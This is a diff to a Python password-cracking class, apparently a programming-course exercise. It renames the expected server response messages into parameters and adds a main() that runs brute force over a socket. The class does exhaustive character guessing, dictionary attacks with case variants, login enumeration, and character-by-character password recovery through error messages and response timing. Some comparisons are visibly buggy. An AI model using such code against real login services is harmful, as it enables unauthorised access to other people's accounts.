@@ -21,7 +21,7 @@ class PasswordHacker:
         self.s.connect((hostname, int(port)))
 
         
-    def pwd_char_cracker(self, chars=None, message='Connection success!'):
+    def pwd_char_cracker(self, chars=None, success_message='Connection success!'):
         chars = chars if chars else self.pwd_chars
 
         for i in range(1, len(chars)+1):
@@ -30,11 +30,11 @@ class PasswordHacker:
             for pwd in cbs:
                 self.s.send(pwd.encode())
 
-                if self.s.recv(1024).decode() == message:
+                if self.s.recv(1024).decode() == success_message:
                     return pwd
 
 
-    def pwd_list_cracker(self, pwd_file='password.txt', message='Connection success!'):
+    def pwd_list_cracker(self, pwd_file='password.txt', success_message='Connection success!'):
         with open(pwd_file) as f:
             pwd_list = f.read().split('\n')
 
@@ -45,14 +45,17 @@ class PasswordHacker:
                 for sg_pwd in all_pwds:
                     self.s.send(sg_pwd.encode())
 
-                    if self.s.recv(1024).decode == message:
+                    if self.s.recv(1024).decode == success_message:
                         return sg_pwd
 
 
     def lg_pwd(self, lg, pwd):
         return json.dumps({'login': lg, 'password': pwd})
     
-    def lg_char_cracker(self, lg_file='logins.txt', chars=None, timing=False):
+    def lg_char_cracker(self, lg_file='logins.txt', chars=None, timing=False,
+                                                                wrong_message='Wrong login!',
+                                                                exception_message='Exception happened during login',
+                                                                success_message='Connection success!'):
         chars, cracked_lg, cracked_pwd = chars if chars else lg_chars, '', ''
 
         with open(lg_file) as f:
@@ -63,7 +66,7 @@ class PasswordHacker:
                 
                 r = json.loads(self.s.recv(1024).decode())['result']
                 
-                if r != 'Wrong login!':
+                if r != wrong_message:
                     cracked_lg = lg
                     break
             
@@ -79,10 +82,10 @@ class PasswordHacker:
                         if time.perf_counter() - start >= 0.1:
                             cracked_pwd += c
                     else:
-                        if r == 'Exception happened during login':
+                        if r == exception_message:
                             cracked_pwd += c
 
-                    if r == 'Connection success!':
+                    if r == success_message:
                         break
         
         return self.lg_pwd(cracked_lg, cracked_pwd)
@@ -91,6 +94,13 @@ class PasswordHacker:
     def close(self):
         self.s.close()
                    
-              
+            
+            
+def main():
+    ph = PasswordHacker()
+    ph.connect()
+    ph.pwd_char_cracker()
+    ph.close()
+    
 if __name__ == '__main__':
-    PasswordHacker()
+    main()
